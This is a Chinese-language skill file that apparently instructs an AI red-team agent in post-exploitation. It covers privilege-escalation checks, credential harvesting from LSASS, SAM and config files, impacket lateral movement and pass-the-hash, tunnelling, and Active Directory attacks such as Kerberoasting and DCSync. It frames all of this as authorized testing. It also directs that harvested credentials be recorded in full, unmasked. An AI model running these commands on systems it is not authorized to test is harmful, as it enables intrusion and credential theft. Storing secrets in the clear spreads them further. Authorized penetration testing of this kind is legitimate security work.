---
name: redteam-ops
description: 拿到初始访问或一个可用凭据后做后渗透时调用——提权、凭据收集、横向移动、域内专项、隧道与数据获取，以及每一步的证据与边界纪律。当 worker 意图涉及「后渗透/提权/横移/域/内网」时使用。
tags:
  cwe: [CWE-269, CWE-522, CWE-250, CWE-732]
  attack: [TA0004, TA0008, TA0006, TA0005, TA0010]
  class: [post-exploitation, privilege-escalation, lateral-movement, credential-access]
---

# 红队后渗透方法论

## 边界与禁止

- 仅在授权范围内操作，遵守【操作约束】；单步最小验证，不批量、不破坏。
- 不删除/篡改业务数据；敏感数据点到为止（证明可访问即可），不批量导出、不留存、不外传。
- 权限维持只做「演示可行」（落一条 fact 说明手法与条件），**不实际部署**长期后门。
- 所有操作必须留证（截图/命令输出/流量 ID），凭据与令牌**全文**写入 fact（不缩写、不掩码——这是后续横向的弹药）。

## 阶段 0：落地稳定化

1. 确认身份与权限：`whoami / id`、`whoami /priv`（Windows）、`hostname`。
2. 确认网络位置：`ip addr` / `ifconfig` / `route print`，标注可达内网段（哪些网段值得横向）。
3. 摸清防御面：是否有 EDR/杀软（`ps aux | grep -i defend`、Windows Defender 事件）、出口是否受限。
4. **先落一条 fact** 记录「初始访问点 + 身份 + 可达网段」——后续意图靠它接续。

## 阶段 1：提权

### Linux 速查
- `sudo -l`（GTFOBins 对照）；`id` 是否在 docker/lxd/disk 组；
- SUID：`find / -perm -4000 -type f 2>/dev/null`（对照 GTFOBins）；
- 定时任务：`cat /etc/crontab`、`ls -la /etc/cron.d/`、`crontab -l`（可写脚本 = 提权）；
- 可写服务配置：`systemctl list-units --type=service` + `ls -la /etc/systemd/system/`；
- 内核/发行版版本 → `search_vulns` 查本地提权 CVE（先 `uname -a`、`cat /etc/os-release`）；
- 环境与历史：`env`、`~/.bash_history`、`~/.ssh/`、`/etc/passwd` 可写性；
- 计划用 linpeas/pspy（宿主工具已装）：`linpeas.sh` 输出保存为证据文件。

### Windows 速查
- `whoami /priv`：SeImpersonate/SeAssignPrimaryToken → Potato 系；SeDebug → 注入 LSASS；
- `whoami /groups`：是否本地管理员/域组；
- 未加引号服务路径：`wmic service get name,pathname,startmode | findstr /i "auto"`；
- 计划任务与服务权限：`schtasks /query /fo LIST /v`、`accesschk.exe`；
- 存储凭据：`cmdkey /list`、浏览器配置、`Get-ChildItem -Recurse -Force $env:APPDATA`；
- 全面体检用 winPEAS（宿主工具）。

## 阶段 2：凭据收集

- Linux：`/etc/shadow`（可读时）、应用配置（.env / config.php / application.yml / settings.py）、
  SSH 私钥、数据库连接串、云元数据（见 cloud 技能）、CI/CD token；
- Windows：LSASS dump（需权限）、SAM/SYSTEM、DPAPI、组策略首选项 GPP；
- 每得到一组凭据：**立即 fact 落库**（用户名/口令或 hash/来源主机/适用服务），并 `auth_request`
  组装验证请求（HTTP 侧）或 `netexec`/`smbclient` 验证（SMB 侧）；
- **不要凭号**：判断锁定策略前最多 2-3 次尝试；域账号喷之前先查 `net accounts`。

## 阶段 3：横向移动

1. 用已有凭据直连：SSH/RDP/SMB/WinRM/数据库（先 `nmap -sV -p 22,445,3389,5985,1433` 确认开放面）；
2. impacket：`psexec.py` / `wmiexec.py` / `smbexec.py` / `secretsdump.py`（已含命令包装器）；
3. Pass-the-hash / Pass-the-ticket：`impacket-wmiexec -hashes :<NTLM> user@host`；
4. 隧道：`chisel`（HTTP 隧道）、`ligolo-ng`（TUN）、`ssh -D`（socks5）；优先选择目标出网允许的形态；
5. 横向扫描收敛：只打已证明归属的网段，`nmap -sT --top-ports 100 -iL ips.txt`；
6. 每跳记录 provenance：从哪台、用什么凭据、到哪台——事实链缺一环，报告就不可信。

## 阶段 4：Windows 域环境专项

- 枚举：`net user /domain`、`net group "Domain Admins" /domain`、`Get-ADUser -Filter *`；
- Kerberoasting：`impacket-GetUserSPNs domain/user:pass -dc-ip <DC> -request` → hashcat -m 13100；
- AS-REP：`impacket-GetNPUsers domain/ -usersfile users.txt -no-pass -format hashcat`；
- DCSync：`impacket-secretsdump domain/admin:pass@dc`（需 Replicating Directory Changes 权限）；
- ADCS：`certipy find -u user@domain -p pass -dc-ip dc`（ESC1-ESC8 模板误配）；
- 委派：`impacket-findDelegation`；
- 攻击路径可视化可选 BloodHound（SharpHound 采集 → 分析），把关键路径写进 fact。

## 阶段 5：数据获取与目标达成

- 先明确「证明什么」：后台权限/某类数据可读/某接口可控——用最小读取证明，不拖库；
- 数据库只读证明：`SELECT ... LIMIT 1`；文件只取一条样本；
- 每次数据读取都要 `save_evidence` 并对 source_url/文件名负责；
- 内网横向拿到的**新服务/新资产登记进资产库**（`insert_assets` / `add_task_scope`），
  未测资产用 `list_untested_assets` 规划下一步。

## 回连与 C2（平台内建，别手搭）

- `listener_start` 起监听，返回解析后的回连地址；payload 直接用返回地址生成；
- 回连落在 `listener_sessions`，逐会话留证；**不要**自建公网 C2；
- 出口形态按平台 C2 配置（direct / SSH 中继 / manual），不自作主张开公网端口。

## 证据与失败处理

- 失败也要落 fact（「测了 X，无 Y」），避免重复尝试与报告里重复叙述；
- 提权/横移尝试被拦（EDR/WAF/策略）→ 记录拦截形态与前置条件，不要反复硬打；
- confidence：直接看到=observed，推断=inferred；推断不能升格为 finding 证据。
